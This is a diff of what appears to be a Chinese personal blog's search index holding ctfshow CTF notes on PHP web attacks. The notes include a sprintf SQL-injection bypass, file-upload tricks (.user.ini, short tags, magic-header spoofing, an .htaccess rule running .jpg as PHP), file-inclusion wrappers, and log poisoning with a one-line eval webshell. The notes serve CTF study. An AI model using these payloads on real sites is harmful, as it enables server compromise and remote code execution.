@@ -1908,6 +1908,25 @@
       </tags>
   </entry>
   <entry>
+    <title>常用姿势</title>
+    <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintf函数"><a href="#1-sprintf函数" class="headerlink" title="1.sprintf函数:"></a>1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+
+<hr>
+<hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+
+<h1 id="linxu命令"><a href="#linxu命令" class="headerlink" title="linxu命令:"></a>linxu命令:</h1><h2 id="1-使用-可以分隔两个命令一起执行"><a href="#1-使用-可以分隔两个命令一起执行" class="headerlink" title="1.使用;可以分隔两个命令一起执行"></a>1.使用;可以分隔两个命令一起执行</h2>]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反序列化</title>
     <url>/2025/06/02/ctfshow/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="常识"><a href="#常识" class="headerlink" title="常识:"></a>常识:</h1><h2 id="1-各类魔术方法"><a href="#1-各类魔术方法" class="headerlink" title="1.各类魔术方法:"></a>1.各类魔术方法:</h2><table>
@@ -2412,17 +2431,165 @@
       </tags>
   </entry>
   <entry>
-    <title>常用姿势</title>
-    <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
-    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintf函数"><a href="#1-sprintf函数" class="headerlink" title="1.sprintf函数:"></a>1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
+    <title>文件上传</title>
+    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="1-user-ini的使用"><a href="#1-user-ini的使用" class="headerlink" title="1. .user.ini的使用:"></a>1. .user.ini的使用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+<h3 id="2-绕过内容里不能包含php"><a href="#2-绕过内容里不能包含php" class="headerlink" title="2.绕过内容里不能包含php:"></a>2.绕过内容里不能包含php:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 条件：short_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. 无条件</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. 条件： 开启配置参数asp_tags=on 且php版本 &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. 条件：php版本 &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<hr>
-<hr>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+<h3 id="3-增加文件头"><a href="#3-增加文件头" class="headerlink" title="3.增加文件头:"></a>3.增加文件头:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---是GIF图像格式的一种版本标识</span><br></pre></td></tr></table></figure>
 
-<h1 id="linxu命令"><a href="#linxu命令" class="headerlink" title="linxu命令:"></a>linxu命令:</h1><h2 id="1-使用-可以分隔两个命令一起执行"><a href="#1-使用-可以分隔两个命令一起执行" class="headerlink" title="1.使用;可以分隔两个命令一起执行"></a>1.使用;可以分隔两个命令一起执行</h2>]]></content>
+<table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>魔术头（十六进制）</th>
+<th>魔术头（ASCII）</th>
+<th>示例用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>GIF89a</strong></td>
+<td><code>47 49 46 38 39 61</code></td>
+<td><code>GIF89a</code></td>
+<td>正规 GIF 图</td>
+</tr>
+<tr>
+<td><strong>GIF87a</strong></td>
+<td><code>47 49 46 38 37 61</code></td>
+<td><code>GIF87a</code></td>
+<td>老版本 GIF 图</td>
+</tr>
+<tr>
+<td><strong>PNG</strong></td>
+<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
+<td><code>.PNG....</code></td>
+<td>PNG 图</td>
+</tr>
+<tr>
+<td><strong>JPG</strong> &#x2F; JPEG</td>
+<td><code>FF D8 FF</code></td>
+<td>N&#x2F;A</td>
+<td>开头是 <code>FFD8FF</code>，结尾是 <code>FFD9</code></td>
+</tr>
+<tr>
+<td><strong>PDF</strong></td>
+<td><code>25 50 44 46 2D</code></td>
+<td><code>%PDF-</code></td>
+<td>经典文档上传绕过</td>
+</tr>
+<tr>
+<td><strong>ZIP</strong></td>
+<td><code>50 4B 03 04</code></td>
+<td><code>PK..</code></td>
+<td>上传压缩包</td>
+</tr>
+<tr>
+<td><strong>RAR</strong></td>
+<td><code>52 61 72 21 1A 07 00</code></td>
+<td><code>Rar!...</code></td>
+<td>压缩文件</td>
+</tr>
+<tr>
+<td><strong>EXE</strong>（Windows）</td>
+<td><code>4D 5A</code></td>
+<td><code>MZ</code></td>
+<td>可执行文件</td>
+</tr>
+<tr>
+<td><strong>ELF</strong>（Linux）</td>
+<td><code>7F 45 4C 46</code></td>
+<td><code>.ELF</code></td>
+<td>Linux 二进制</td>
+</tr>
+<tr>
+<td><strong>MP3</strong></td>
+<td><code>49 44 33</code></td>
+<td><code>ID3</code></td>
+<td>音频文件头</td>
+</tr>
+<tr>
+<td><strong>DOCX &#x2F; XLSX &#x2F; PPTX</strong></td>
+<td><code>50 4B 03 04</code></td>
+<td>ZIP！</td>
+<td>Office 新版其实是 ZIP 容器</td>
+</tr>
+<tr>
+<td><strong>OLD DOC (97-2003)</strong></td>
+<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
+<td>N&#x2F;A</td>
+<td>老式 Office 文件</td>
+</tr>
+</tbody></table>
+<h3 id="4-远程包含"><a href="#4-远程包含" class="headerlink" title="4.远程包含:"></a>4.远程包含:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在服务器上可以通过ip转数字，让他访问木马脚本网站，并执行</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-通过jpg-gif-png二次渲染"><a href="#5-通过jpg-gif-png二次渲染" class="headerlink" title="5.通过jpg.gif.png二次渲染;"></a>5.通过jpg.gif.png二次渲染;</h3><h4 id="1-是否存在二次渲染"><a href="#1-是否存在二次渲染" class="headerlink" title="1.是否存在二次渲染:"></a>1.是否存在二次渲染:</h4><table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+<th>判断方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>上传后图像被重新压缩</td>
+<td>MD5不一致</td>
+<td>上传后下载图片对比</td>
+</tr>
+<tr>
+<td>上传的 EXIF 信息被清除</td>
+<td>文件属性被抹掉</td>
+<td><code>exif_read_data()</code> 检查</td>
+</tr>
+<tr>
+<td>伪代码失效</td>
+<td>木马内容被去掉</td>
+<td><code>&lt;?php ... ?&gt;</code> 被清空</td>
+</tr>
+<tr>
+<td>文件大小被大幅缩小</td>
+<td>说明被重新处理</td>
+<td>查看上传前后大小差距</td>
+</tr>
+<tr>
+<td>Webshell 不再执行</td>
+<td>二次渲染清除了恶意代码</td>
+<td>手动访问判断是否能执行PHP代码</td>
+</tr>
+</tbody></table>
+<h3 id="6-通过-htaccess包含"><a href="#6-通过-htaccess包含" class="headerlink" title="6.通过.htaccess包含:"></a>6.通过.htaccess包含:</h3><p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-通过伪协议"><a href="#1-通过伪协议" class="headerlink" title="1.通过伪协议"></a>1.通过伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  主要用于读取源码</span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  经常使用file_get_contents获取php://input内容</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  执行命令      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  访问本地文件系统</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     协议用于读取压缩文件</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-php-filter-使用方法"><a href="#1-php-filter-使用方法" class="headerlink" title="1.php:&#x2F;&#x2F;filter 使用方法"></a>1.php:&#x2F;&#x2F;filter 使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=过滤器名/resource=目标文件        --基本格式     --read可以改为write </span></span><br><span class="line">                                        --默认是read，有时可不写read,可以不加过滤器</span><br><span class="line">一些过滤器:</span><br><span class="line">            convert.base64-encode	base64 编码输出</span><br><span class="line">            convert.base64-decode	base64 解码输入</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable 编码</span><br><span class="line">            <span class="keyword">string</span>.strip_tags	去除 HTML/PHP 标签      --php7.<span class="number">3</span>.x后废弃</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 替换加密</span><br><span class="line">            <span class="keyword">string</span>.toupper	字母转大写</span><br><span class="line">            <span class="keyword">string</span>.tolower	字母转小写</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
+
+<h4 id="2-php-input-使用方法"><a href="#2-php-input-使用方法" class="headerlink" title="2.php:&#x2F;&#x2F;input 使用方法:"></a>2.php:&#x2F;&#x2F;input 使用方法:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --用于读取 HTTP 请求体的原始内容</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-data-使用方法"><a href="#3-data-使用方法" class="headerlink" title="3.data:&#x2F;&#x2F;使用方法"></a>3.data:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatype（MIME类型）比如：text/plain、text/html  </span></span><br><span class="line">                               --data，必须是完整的php代码</span><br><span class="line">mediatype（MIME类型）:</span><br><span class="line">                    text/plain	纯文本	✅ 推荐，用于执行 PHP 代码</span><br><span class="line">                    text/html	HTML 格式	✅ 也能执行 PHP，显示为网页</span><br><span class="line">                    text/xml	XML 格式	通常用于接口测试</span><br><span class="line">                    application/json	JSON 数据	多用于 API</span><br><span class="line">                    application/x-www-form-urlencoded	表单数据（普通POST）	API 数据传输</span><br><span class="line">                    application/javascript	JS 脚本	通常用于网页环境，不用于PHP</span><br><span class="line">                    image/png	图片	不适合执行 PHP</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-file-使用方法"><a href="#4-file-使用方法" class="headerlink" title="4.file:&#x2F;&#x2F;使用方法"></a>4.file:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//绝对路径                 </span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-通过日志"><a href="#2-通过日志" class="headerlink" title="2.通过日志"></a>2.通过日志</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --通过nginx中日志的路径</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --查看配置信息</span><br></pre></td></tr></table></figure>
+
+]]></content>
       <categories>
         <category>web学习</category>
       </categories>
@@ -3135,173 +3302,6 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="1-user-ini的使用"><a href="#1-user-ini的使用" class="headerlink" title="1. .user.ini的使用:"></a>1. .user.ini的使用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-绕过内容里不能包含php"><a href="#2-绕过内容里不能包含php" class="headerlink" title="2.绕过内容里不能包含php:"></a>2.绕过内容里不能包含php:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 条件：short_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. 无条件</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. 条件： 开启配置参数asp_tags=on 且php版本 &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. 条件：php版本 &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-增加文件头"><a href="#3-增加文件头" class="headerlink" title="3.增加文件头:"></a>3.增加文件头:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---是GIF图像格式的一种版本标识</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>文件类型</th>
-<th>魔术头（十六进制）</th>
-<th>魔术头（ASCII）</th>
-<th>示例用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>GIF89a</strong></td>
-<td><code>47 49 46 38 39 61</code></td>
-<td><code>GIF89a</code></td>
-<td>正规 GIF 图</td>
-</tr>
-<tr>
-<td><strong>GIF87a</strong></td>
-<td><code>47 49 46 38 37 61</code></td>
-<td><code>GIF87a</code></td>
-<td>老版本 GIF 图</td>
-</tr>
-<tr>
-<td><strong>PNG</strong></td>
-<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
-<td><code>.PNG....</code></td>
-<td>PNG 图</td>
-</tr>
-<tr>
-<td><strong>JPG</strong> &#x2F; JPEG</td>
-<td><code>FF D8 FF</code></td>
-<td>N&#x2F;A</td>
-<td>开头是 <code>FFD8FF</code>，结尾是 <code>FFD9</code></td>
-</tr>
-<tr>
-<td><strong>PDF</strong></td>
-<td><code>25 50 44 46 2D</code></td>
-<td><code>%PDF-</code></td>
-<td>经典文档上传绕过</td>
-</tr>
-<tr>
-<td><strong>ZIP</strong></td>
-<td><code>50 4B 03 04</code></td>
-<td><code>PK..</code></td>
-<td>上传压缩包</td>
-</tr>
-<tr>
-<td><strong>RAR</strong></td>
-<td><code>52 61 72 21 1A 07 00</code></td>
-<td><code>Rar!...</code></td>
-<td>压缩文件</td>
-</tr>
-<tr>
-<td><strong>EXE</strong>（Windows）</td>
-<td><code>4D 5A</code></td>
-<td><code>MZ</code></td>
-<td>可执行文件</td>
-</tr>
-<tr>
-<td><strong>ELF</strong>（Linux）</td>
-<td><code>7F 45 4C 46</code></td>
-<td><code>.ELF</code></td>
-<td>Linux 二进制</td>
-</tr>
-<tr>
-<td><strong>MP3</strong></td>
-<td><code>49 44 33</code></td>
-<td><code>ID3</code></td>
-<td>音频文件头</td>
-</tr>
-<tr>
-<td><strong>DOCX &#x2F; XLSX &#x2F; PPTX</strong></td>
-<td><code>50 4B 03 04</code></td>
-<td>ZIP！</td>
-<td>Office 新版其实是 ZIP 容器</td>
-</tr>
-<tr>
-<td><strong>OLD DOC (97-2003)</strong></td>
-<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
-<td>N&#x2F;A</td>
-<td>老式 Office 文件</td>
-</tr>
-</tbody></table>
-<h3 id="4-远程包含"><a href="#4-远程包含" class="headerlink" title="4.远程包含:"></a>4.远程包含:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在服务器上可以通过ip转数字，让他访问木马脚本网站，并执行</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-通过jpg-gif-png二次渲染"><a href="#5-通过jpg-gif-png二次渲染" class="headerlink" title="5.通过jpg.gif.png二次渲染;"></a>5.通过jpg.gif.png二次渲染;</h3><h4 id="1-是否存在二次渲染"><a href="#1-是否存在二次渲染" class="headerlink" title="1.是否存在二次渲染:"></a>1.是否存在二次渲染:</h4><table>
-<thead>
-<tr>
-<th>条件</th>
-<th>说明</th>
-<th>判断方法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>上传后图像被重新压缩</td>
-<td>MD5不一致</td>
-<td>上传后下载图片对比</td>
-</tr>
-<tr>
-<td>上传的 EXIF 信息被清除</td>
-<td>文件属性被抹掉</td>
-<td><code>exif_read_data()</code> 检查</td>
-</tr>
-<tr>
-<td>伪代码失效</td>
-<td>木马内容被去掉</td>
-<td><code>&lt;?php ... ?&gt;</code> 被清空</td>
-</tr>
-<tr>
-<td>文件大小被大幅缩小</td>
-<td>说明被重新处理</td>
-<td>查看上传前后大小差距</td>
-</tr>
-<tr>
-<td>Webshell 不再执行</td>
-<td>二次渲染清除了恶意代码</td>
-<td>手动访问判断是否能执行PHP代码</td>
-</tr>
-</tbody></table>
-<h3 id="6-通过-htaccess包含"><a href="#6-通过-htaccess包含" class="headerlink" title="6.通过.htaccess包含:"></a>6.通过.htaccess包含:</h3><p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含</title>
-    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="1-通过伪协议"><a href="#1-通过伪协议" class="headerlink" title="1.通过伪协议"></a>1.通过伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  主要用于读取源码</span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  经常使用file_get_contents获取php://input内容</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  执行命令      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  访问本地文件系统</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     协议用于读取压缩文件</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="1-php-filter-使用方法"><a href="#1-php-filter-使用方法" class="headerlink" title="1.php:&#x2F;&#x2F;filter 使用方法"></a>1.php:&#x2F;&#x2F;filter 使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=过滤器名/resource=目标文件        --基本格式     --read可以改为write </span></span><br><span class="line">                                        --默认是read，有时可不写read,可以不加过滤器</span><br><span class="line">一些过滤器:</span><br><span class="line">            convert.base64-encode	base64 编码输出</span><br><span class="line">            convert.base64-decode	base64 解码输入</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable 编码</span><br><span class="line">            <span class="keyword">string</span>.strip_tags	去除 HTML/PHP 标签      --php7.<span class="number">3</span>.x后废弃</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 替换加密</span><br><span class="line">            <span class="keyword">string</span>.toupper	字母转大写</span><br><span class="line">            <span class="keyword">string</span>.tolower	字母转小写</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
-
-<h4 id="2-php-input-使用方法"><a href="#2-php-input-使用方法" class="headerlink" title="2.php:&#x2F;&#x2F;input 使用方法:"></a>2.php:&#x2F;&#x2F;input 使用方法:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --用于读取 HTTP 请求体的原始内容</span></span><br></pre></td></tr></table></figure>
-
